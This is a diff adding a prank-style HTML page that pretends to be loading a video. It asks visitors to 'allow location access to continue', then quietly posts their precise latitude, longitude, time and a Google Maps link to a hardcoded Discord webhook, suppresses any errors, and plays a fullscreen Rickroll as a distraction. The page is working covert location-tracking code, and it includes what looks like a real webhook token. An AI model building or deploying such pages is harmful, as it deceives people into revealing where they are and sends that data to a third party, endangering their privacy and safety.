@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    body { 
+      margin: 0; 
+      padding: 0; 
+      background: #000; 
+      color: white; 
+      font-family: Arial, sans-serif; 
+      text-align: center; 
+      overflow: hidden;
+    }
+    #status {
+      position: absolute;
+      top: 20px;
+      left: 0;
+      right: 0;
+      z-index: 10;
+      font-size: 18px;
+    }
+    #video {
+      width: 100vw;
+      height: 100vh;
+      object-fit: contain;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">Please allow location access to continue...</div>
+
+  <iframe 
+    id="video" 
+    style="display: none;" 
+    src="https://www.youtube.com/embed/QDia3e12czc?autoplay=1&modestbranding=1&rel=0" 
+    title="Rickroll" 
+    frameborder="0" 
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+    allowfullscreen>
+  </iframe>
+
+  <script>
+    const webhookUrl = "https://discord.com/api/webhooks/1496992326613074151/ksCzYavEYpnu3ecrCpEMHiVDNvX0SMmU89NF8s9eOYGgLid054OkRlr8dQ6cIkZLluE8";   // ← Replace with your Discord webhook URL
+
+    function sendToDiscord(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const timestamp = new Date().toLocaleString();
+
+      const embed = {
+        embeds: [{
+          title: "📍 New Location Accepted!",
+          color: 0x00ff00,
+          fields: [
+            { name: "Latitude", value: lat.toFixed(6), inline: true },
+            { name: "Longitude", value: lon.toFixed(6), inline: true },
+            { name: "Time", value: timestamp, inline: false },
+            { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false }
+          ],
+          footer: { text: "Location Logger + Rickroll" }
+        }]
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embed)
+      }).catch(() => {}); // silent fail
+    }
+
+    function handleError(err) {
+      document.getElementById("status").innerHTML = "Location blocked. Playing anyway...";
+      startRickroll();
+    }
+
+    function startRickroll() {
+      document.getElementById("status").style.display = "none";
+      document.getElementById("video").style.display = "block";
+      
+      // Optional: force fullscreen (works better on mobile)
+      const video = document.getElementById("video");
+      if (video.requestFullscreen) video.requestFullscreen();
+    }
+
+    // Main logic: Ask for location first, then play rickroll
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          sendToDiscord(position);
+          startRickroll();
+        },
+        handleError,
+        { enableHighAccuracy: true, timeout: 8000 }
+      );
+    } else {
+      // No geolocation support → just rickroll
+      startRickroll();
+    }
+  </script>
+</body>
+</html>
